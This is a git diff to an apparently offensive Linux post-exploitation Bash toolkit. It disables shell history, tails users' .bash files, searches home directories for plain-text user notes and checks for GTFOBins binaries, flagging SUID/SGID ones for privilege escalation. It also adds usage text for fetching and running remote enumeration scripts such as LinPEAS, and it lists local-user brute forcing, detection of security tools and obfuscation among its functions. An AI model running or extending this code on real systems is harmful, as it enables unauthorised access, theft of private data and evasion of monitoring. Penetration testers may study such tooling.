@@ -1,6 +1,7 @@
 #!/bin/bash
 
 # metalgvc
+VERSION="1.0.1"
 
 export HISTSIZE=0
 export HISTFILE=/dev/null
@@ -102,20 +103,7 @@ function action_users() {
   separator
 
   header "tail /home/*/.bash*"
-  tail -n 50 /home/*/.bash*
-  separator
-
-  header "user notes"
-  #find /home/* -type f -name "*.txt" -o ! -name "*.*"
-  #find /home/* -type f \( -name "*.txt" -o ! -name "*.*" \) -size -10k -exec file --mime-type {} \; | grep 'text/plain' | grep -v -E '(.mozilla/firefox)|(/.oh-my-zsh/)|(/.local/)|(/.BurpSuite/)|(/.git/)|(/LICENSE)|(/lib/)|(/.npm/)|(/.config/)|(/.cache/)' | cut -d: -f1
-  find /home/* -type f \( -name "*.txt" -o ! -name "*.*" \) -size -10k \
-      \( ! -path "*/.mozilla/*" -a ! -path "*/.oh-my-zsh/*" -a ! -path "*/.local/*" \
-      -a ! -path "*/.BurpSuite/*" -a ! -path "*/.git/*" -a ! -path "*/LICENSE" \
-      -a ! -path "*/lib/*" -a ! -path "*/.npm/*" -a ! -path "*/.config/*" \
-      -a ! -path "*/.cache/*" -a ! -path "*/cache/*" -a ! -name "license" \
-      -a ! -path "*/node_modules/*" -a ! -path "*/.cargo/*" \
-      -a ! -path "*/.pyenv/*" -a ! -path "*/.nvm/*"\) \
-      -exec file --mime-type {} \; 2>/dev/null | grep 'text/plain' | cut -d: -f1
+  tail -n 100 /home/*/.bash*
   separator
 
   header "ls -la /etc/security"
@@ -527,6 +515,21 @@ function action_search_vimrc_files() {
     header ".vimrc files"
     find /home/* -type f -name ".vimrc" 2> /dev/null
     separator
+}
+
+function action_search_usernotes_files() {
+  header "user notes"
+
+  find /home/* -type f \( -name "*.txt" -o ! -name "*.*" \) -size -10k \
+      \( ! -path "*/.mozilla/*" -a ! -path "*/.oh-my-zsh/*" -a ! -path "*/.local/*" \
+      -a ! -path "*/.BurpSuite/*" -a ! -path "*/.git/*" -a ! -path "*/LICENSE" \
+      -a ! -path "*/lib/*" -a ! -path "*/.npm/*" -a ! -path "*/.config/*" \
+      -a ! -path "*/.cache/*" -a ! -path "*/cache/*" -a ! -name "license" \
+      -a ! -path "*/node_modules/*" -a ! -path "*/.cargo/*" \
+      -a ! -path "*/.pyenv/*" -a ! -path "*/.nvm/*" \) \
+      -exec file --mime-type {} \; 2>/dev/null | grep 'text/plain' | cut -d: -f1
+
+  separator
 }
 
 # ======================================================================================================================
@@ -1005,26 +1008,27 @@ function script_files() {
   if [[ "$1" == "-h" ]]; then
     echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT [action]\n"
     echo -e " ${BLUE}actions:${NC}"
-    echo -e "   ${YELLOW}env${NC}         \t .env, .hashes, .credentials files"
-    echo -e "   ${YELLOW}history${NC}     \t history files"
-    echo -e "   ${YELLOW}kerberos${NC}    \t kerberos tickets"
+    echo -e "   ${YELLOW}env${NC}           \t .env, .hashes, .credentials files"
+    echo -e "   ${YELLOW}history${NC}       \t history files"
+    echo -e "   ${YELLOW}kerberos${NC}      \t kerberos tickets"
+    echo -e "   ${YELLOW}usernotes${NC}     \t try to find user notes text files"
     echo -e "   ${YELLOW}projectconfig${NC} \t project configs"
-    echo -e "   ${YELLOW}db${NC}          \t db files & sql"
-    echo -e "   ${YELLOW}backups${NC}     \t backups files"
-    echo -e "   ${YELLOW}script${NC}      \t script files"
-    echo -e "   ${YELLOW}sysconfigs${NC}  \t system configs"
-    echo -e "   ${YELLOW}docs${NC}        \t documents"
-    echo -e "   ${YELLOW}archives${NC}    \t archives files"
-    echo -e "   ${YELLOW}large${NC}       \t large files"
-    echo -e "   ${YELLOW}recent${NC}      \t recent modified files"
-    echo -e "   ${YELLOW}suid${NC}        \t SUID & GUID files"
-    echo -e "   ${YELLOW}acl${NC}         \t ACL files"
-    echo -e "   ${YELLOW}vimrc${NC}       \t .vimrc files"
+    echo -e "   ${YELLOW}db${NC}            \t db files & sql"
+    echo -e "   ${YELLOW}backups${NC}       \t backups files"
+    echo -e "   ${YELLOW}script${NC}        \t script files"
+    echo -e "   ${YELLOW}sysconfigs${NC}    \t system configs"
+    echo -e "   ${YELLOW}docs${NC}          \t documents"
+    echo -e "   ${YELLOW}archives${NC}      \t archives files"
+    echo -e "   ${YELLOW}large${NC}         \t large files"
+    echo -e "   ${YELLOW}recent${NC}        \t recent modified files"
+    echo -e "   ${YELLOW}suid${NC}          \t SUID & GUID files"
+    echo -e "   ${YELLOW}acl${NC}           \t ACL files"
+    echo -e "   ${YELLOW}vimrc${NC}         \t .vimrc files"
     echo -e "\n no action - run all"
     exit 1
   fi
 
-  local actions="env history kerberos projectconfig db backups script sysconfigs docs archives large recent suid acl vimrc"
+  local actions="env history kerberos usernotes projectconfig db backups script sysconfigs docs archives large recent suid acl vimrc"
 
   # run separate action
   if [[ -n $1 ]]; then
@@ -1035,6 +1039,7 @@ function script_files() {
   action_search_env_files
   action_search_history_files
   action_search_kerberos_files
+  action_search_usernotes_files
   action_search_projectconfig_files
   action_search_db_files
   action_search_backups_files
@@ -1137,6 +1142,25 @@ function script_scan_local_networks() {
         done
         wait
     done
+}
+
+function script_gtfobins() {
+  local bins="7z aa-exec ab agetty alpine ansible-playbook ansible-test aoss apache2ctl apt apt-get ar aria2c arj arp as ascii85 ascii-xfr ash aspell at atobm awk aws base32 base58 base64 basenc basez bash batcat bc bconsole bpftrace bridge bundle bundler busctl busybox byebug bzip2 c89 c99 cabal cancel capsh cat cdist certbot check_by_ssh check_cups check_log check_memory check_raid check_ssl_cert check_statusfile chmod choom chown chroot clamscan cmp cobc column comm composer cowsay cowthink cp cpan cpio cpulimit crash crontab csh csplit csvtool cupsfilter curl cut dash date dc dd debugfs dialog diff dig distcc dmesg dmidecode dmsetup dnf docker dos2unix dosbox dotnet dpkg dstat dvips easy_install eb ed efax elvish emacs enscript env eqn espeak ex exiftool expand expect facter file find finger fish flock fmt fold fping ftp gawk gcc gcloud gcore gdb gem genie genisoimage ghc ghci gimp ginsh git grc grep gtester gzip hd head hexdump highlight hping3 iconv iftop install ionice ip irb ispell jjs joe join journalctl jq jrunscript jtag julia knife ksh ksshell ksu kubectl latex latexmk ldconfig ld.so less lftp links ln loginctl logsave look lp ltrace lua lualatex luatex lwp-download lwp-request mail make man mawk minicom more mosquitto mount msfconsole msgattrib msgcat msgconv msgfilter msgmerge msguniq mtr multitime mv mysql nano nasm nawk nc ncdu ncftp neofetch nft nice nl nm nmap node nohup npm nroff nsenter ntpdate octave od openssl openvpn openvt opkg pandoc paste pax pdb pdflatex pdftex perf perl perlbug pexec pg php pic pico pidstat pip pkexec pkg posh pr pry psftp psql ptx puppet pwsh python rake rc readelf red redcarpet redis restic rev rlogin rlwrap rpm rpmdb rpmquery rpmverify rsync rtorrent ruby run-mailcap run-parts runscript rview rvim sash scanmem scp screen script scrot sed service setarch setfacl setlock sftp sg shuf slsh smbclient snap socat socket soelim softlimit sort split sqlite3 sqlmap ss ssh ssh-agent ssh-keygen ssh-keyscan sshpass start-stop-daemon stdbuf strace strings su sudo sysctl systemctl systemd-resolve tac tail tar task taskset tasksh tbl tclsh tcpdump tdbtool tee telnet terraform tex tftp tic time timedatectl timeout tmate tmux top torify torsocks troff tshark ul unexpand uniq unshare unsquashfs unzip update-alternatives uudecode uuencode vagrant valgrind varnishncsa vi view vigr vim vimdiff vipw virsh volatility w3m wall watch wc wget whiptail whois wireshark wish xargs xdg-user-dir xdotool xelatex xetex xmodmap xmore xpad xxd xz yarn yash yelp yum zathura zip zsh zsoelim zypper"
+
+  echo -e "${GREEN}#${NC} https://gtfobins.github.io/\n"
+  echo -e "${YELLOW}[*]${NC} Checking for installed GTFOBins..."
+
+  for bin in $bins; do
+    if which "$bin" &>/dev/null; then
+      local bpath=$(which "$bin")
+      local prefix="${GREEN}[+]${NC}"
+      if [[ -u $bpath || -g $bpath ]]; then
+        prefix="${RED}[!]${NC}"
+      fi
+      local perms=$(ls -la "$bpath" 2>/dev/null | cut -d' ' -f1)
+      echo -e "${prefix} ${perms} ${bin}      \t https://gtfobins.github.io/gtfobins/${bin}/"
+    fi
+  done
 }
 
 function script_ports_scanner() {
@@ -1294,19 +1318,19 @@ function script_bruteforce_localuser() {
 function script_detect_security_tools() {
     header "detect security & defence tools"
 
-    if pgrep auditd; then
+    if pgrep auditd &> /dev/null; then
       echo -e "- Auditd (security audit logging)"
     fi
 
-    if pgrep ossec; then
+    if pgrep ossec &> /dev/null; then
       echo -e "- OSSEC (intrusion detection)"
     fi
 
-    if pgrep iptables; then
+    if pgrep iptables &> /dev/null; then
       echo -e "- iptables (firewall)"
     fi
 
-    if pgrep ufw; then
+    if pgrep ufw &> /dev/null; then
       echo -e "- ufw (firewall)"
     fi
 
@@ -1352,6 +1376,12 @@ function script_start_ftp_server() {
 function script_exec_remote_bash() {
   if [[ "$1" == "-h" || -z $1 ]]; then
     echo -e "${GREEN}usage:${NC} $SCRIPT $INNER_SCRIPT <SCRIPT_URL>"
+    echo -e " ${YELLOW}example:${NC} $SCRIPT $INNER_SCRIPT https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
+    echo -e "\n ${YELLOW}some useful scripts:${NC}"
+    echo -e "  LinPEAS           https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
+    echo -e "  LES               https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh"
+    echo -e "  LinEnum           https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh"
+    echo -e "  Linux Smart Enum  https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/refs/heads/master/lse.sh"
     exit 1
   fi
 
@@ -1448,6 +1478,9 @@ function script_obfuscate() {
 function script_help() {
   help
 
+  echo -e " -h \t script help"
+  echo -e " -v \t script version"
+
   header "privesc & enum scripts (tip: use ${NC}rexec${YELLOW} script to run from server)"
   tips "linpeas.sh                 https://github.com/peass-ng/PEASS-ng/releases"
   tips "LinEnum.sh                 https://github.com/rebootuser/LinEnum"
@@ -1497,6 +1530,7 @@ function help() {
     echo -e "   ${YELLOW}logs${NC}          \t search interesting in logs"
     echo -e "   ${YELLOW}searchw${NC}       \t search writable directories & files"
     echo -e "   ${YELLOW}installedsoft${NC} \t list installed packages & soft"
+    echo -e "   ${YELLOW}gtfobins${NC}      \t check for installed GTFOBins"
 
     echo -e "\n ${BLUE}scaner scripts:${NC}"
     echo -e "   ${YELLOW}networkscan${NC} [params]     \t scan internal network(s) for avail hosts"
@@ -1523,11 +1557,10 @@ function help() {
     echo -e "   ${YELLOW}sectooldetect${NC} [params]      \t detect security tools"
     echo -e "   ${YELLOW}obfuscate${NC} [params]          \t obfuscate script"
 
-    echo -e "---\n\nhelp or -h: tips"
-    echo -e "${0} <script> -h \t script help"
+    echo -e "---\n\nhelp or -h: help & tips"
 }
 
-scripts="info files passwords logs searchw installedsoft networkscan bashscan ncscan sendf httpserver ftpserver smbserver rexec download fsmon obfuscate localuser sectooldetect help -h"
+scripts="info files passwords logs searchw installedsoft gtfobins networkscan bashscan ncscan sendf httpserver ftpserver smbserver rexec download fsmon obfuscate localuser sectooldetect help -h -v"
 if [[ -z "$1" || ! "$scripts" =~ (^|[[:space:]])"$1"($|[[:space:]]) ]]; then
   help
   exit 1
@@ -1540,6 +1573,7 @@ case "$INNER_SCRIPT" in
   "passwords") script_passwords ;;
   "logs") script_logs ;;
   "installedsoft") script_installed_soft ;;
+  "gtfobins") script_gtfobins ;;
   
   "networkscan") script_scan_local_networks "$2" "$3" "$4" "$5" ;;
   "bashscan") script_ports_scanner "$2" "$3" "$4" "$5" ;;
@@ -1558,6 +1592,8 @@ case "$INNER_SCRIPT" in
   "sectooldetect") script_detect_security_tools ;;
   "obfuscate") script_obfuscate "$2" "$3" ;;
   "-h"|"help") script_help ;;
+  "-v") echo $VERSION ;;
+
   *) help; exit 1 ;;
 esac
 
